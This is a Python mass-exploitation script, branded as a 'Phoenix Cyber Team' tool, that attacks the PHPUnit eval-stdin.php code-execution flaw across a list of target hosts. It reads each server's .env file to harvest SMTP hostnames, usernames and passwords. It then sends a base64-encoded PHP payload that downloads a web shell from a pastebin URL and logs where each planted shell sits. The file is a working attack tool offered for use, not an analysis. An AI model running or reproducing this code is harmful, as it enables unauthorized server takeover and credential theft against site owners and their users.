# Priv8 Tools

banner = """
 ___            __        _______        __  ___      ___  _______  ___           _______     ______  ___________     
|"  |          /""\      /"      \      /""\|"  \    /"  |/"     "||"  |         |   _  "\   /    " \("     _   ")    
||  |         /    \    |:        |    /    \\   \  //  /(: ______)||  |         (. |_)  :) // ____  \)__/  \\__/     
|:  |        /' /\  \   |_____/   )   /' /\  \\\  \/. ./  \/    |  |:  |         |:     \/ /  /    ) :)  \\_ /        
 \  |___    //  __'  \   //      /   //  __'  \\.    //   // ___)_  \  |___      (|  _  \\(: (____/ //   |.  |        
( \_|:  \  /   /  \\  \ |:  __   \  /   /  \\  \\\   /   (:      "|( \_|:  \     |: |_)  :)\        /    \:  |        
 \_______)(___/    \___)|__|  \___)(___/    \___)\__/     \_______) \_______)    (_______/  \"_____/      \__|        
                                                                                                                                              

                           Mr.T0B1@Phoenix Cyber Team
"""
print("-------------..:Pentesting Process:..--------------")
import requests, re, sys, threading
from  time import sleep
from urlparse import urlparse
requests.packages.urllib3.disable_warnings()
import threading, time, random
from Queue import Queue
from threading import *
screenlock = Semaphore(value=1)

vuln = 0
bad = 0
shel = 0
smtp = 0

def get_smtp(url):
        global smtp
        fin = url.replace("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/.env")
        try:
                spawn = requests.get(fin, timeout=15, verify=False).text
                if "MAIL_HOST" in spawn and "MAIL_USERNAME" in spawn:
                        host = re.findall("\nMAIL_HOST=(.*?)\n", spawn)[0]
                        port = re.findall("\nMAIL_PORT=(.*?)\n", spawn)[0]
                        user = re.findall("\nMAIL_USERNAME=(.*?)\n", spawn)[0]
                        pasw = re.findall("\nMAIL_PASSWORD=(.*?)\n", spawn)[0]
                        if user == "null" or pasw == "null" or user == "" or pasw == "":
                                pass
                        if "mailtrap" in user:
                                pass
                        else:
                                screenlock.acquire()
                                print("\033[44m -- SMTP -- \033[0m "+fin)
                                smtp = smtp + 1
                                file = open("smtp.txt","a")
                                geturl = fin.replace(".env","")
                                pack = geturl+"|"+host+"|"+port+"|"+user+"|"+pasw
                                file.write(pack+"\n")
                                file.close()
                                screenlock.release()
        except KeyboardInterrupt:
                print("Closed")
                exit()
        except:
                
                pass

def exploit(url):
        get_smtp(url)
        global vuln
        global bad
        global shel
        try:
                data = "<?php phpinfo(); ?>"
                text = requests.get(url, data=data, timeout=15, verify=False)
                if "phpinfo" in text.text:
                        screenlock.acquire()
                        print("\033[42;1m -- RENTAN -- \033[0m "+url)
                        screenlock.release()
                        vuln = vuln + 1
                        wre = open("vulnerable.txt", "a")
                        wre.write(url+"\n")
                        wre.close()
                        data2 = "<?php eval('?>'.base64_decode('PD9waHANCmZ1bmN0aW9uIGFkbWluZXIoJHVybCwgJGlzaSkgew0KCSRmcCA9IGZvcGVuKCRpc2ksICJ3Iik7DQoJJGNoID0gY3VybF9pbml0KCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0JJTkFSWVRSQU5TRkVSLCB0cnVlKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgZmFsc2UpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GSUxFLCAkZnApOw0KCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsNCgljdXJsX2Nsb3NlKCRjaCk7DQoJZmNsb3NlKCRmcCk7DQoJb2JfZmx1c2goKTsNCglmbHVzaCgpOw0KfQ0KaWYoYWRtaW5lcigiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzRjajhTOGM5IiwicGN0LnBocCIpKSB7DQoJZWNobyAiU3Vrc2VzIjsNCn0gZWxzZSB7DQoJZWNobyAiZmFpbCI7DQp9DQo/Pg==')); ?>"
                        spawn = requests.get(url, data=data2, timeout=15, verify=False)
                        if "Sukses" in spawn.text:
                                screenlock.acquire()
                                print("     \033[42;1m | \033[0m Shell Ter Upload")
                                screenlock.release()
                                shel = shel + 1
                                wrs = open("aksesphoenix.txt", "a")
                                pathshell = url.replace("eval-stdin.php","pct.php")
                                wrs.write(pathshell+"\n")
                                wrs.close()
                        else:
                                screenlock.acquire()
                                print("     \033[41;1m | \033[0m Gagal Up Shell")
                                screenlock.release()
                else:
                        screenlock.acquire()
                        print("\033[41;1m -- TIDAK VULN -- \033[0m "+url)
                        screenlock.release()
                        bad = bad + 1
        except KeyboardInterrupt:
                print("Closed")
                exit()
        except Exception as err:
                screenlock.acquire()
                print("\033[43;1m -- ERRN -- \033[0m "+url)
                screenlock.release()
                bad = bad + 1
try:
        list = sys.argv[1]
except:
        print "\033[311m"+banner+"\033[0m"
        print("\n\n# How To use? Check My Youtube Channel Tzb1 (Sorry Updating This Not work i will updating this tools)")
        exit()
asu = open(list).read().splitlines()
jobs = Queue()
def do_stuff(q):
        while not q.empty():
                i = q.get()
                exp = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
                if i.startswith("http"):
                        url = i+exp
                        exploit(url)
                else:
                        url = "http://"+i+exp
                        exploit(url)
                q.task_done()

for trgt in asu:
        jobs.put(trgt)

for i in range(30): # Default 10 Thread Ganti Aja Kalau Mau
        worker = threading.Thread(target=do_stuff, args=(jobs,))
        worker.start()
jobs.join()
print("\033[1;91m---------------------------------------------------------------------------------------------\033[0m")
print("\033[1;91m  ____  _                      _         ____      _                 _                       \033[0m")
print("\033[1;91m |  _ \| |__   ___   ___ _ __ (_)_  __  / ___|   _| |__   ___ _ __  | |_ ___  __ _ _ __ ___  \033[0m")
print("\033[1;91m | |_) | '_ \ / _ \ / _ \ '_ \| \ \/ / | |  | | | | '_ \ / _ \ '__| | __/ _ \/ _` | '_ ` _ \ \033[0m")
print("\033[1;91m |  __/| | | | (_) |  __/ | | | |>  <  | |__| |_| | |_) |  __/ |    | ||  __/ (_| | | | | | |\033[0m")
print("\033[1;91m |_|   |_| |_|\___/ \___|_| |_|_/_/\_\  \____\__, |_.__/ \___|_|     \__\___|\__,_|_| |_| |_|\033[0m")
print("\033[1;91m                                             |___/                                           \033[0m")
print("\033[1;91m---------------------------------------------------------------------------------------------\033[0m")
print("\033[1;91mYT CHANNEL:Mr.T0B1 Official")
print("\033[1;91m---------------------------------------------------------------------------------------------")
print("\033[44mSMTP            : \033[0m "+str(smtp))
print("\033[42;1mShell Ketanem : \033[0m "+str(shel))
print("\033[43;1mKe Exploit      : \033[0m "+str(vuln))
print("\033[41;1mTidak Vuln  : \033[0m "+str(bad))
# Recoded By MR.T0B1
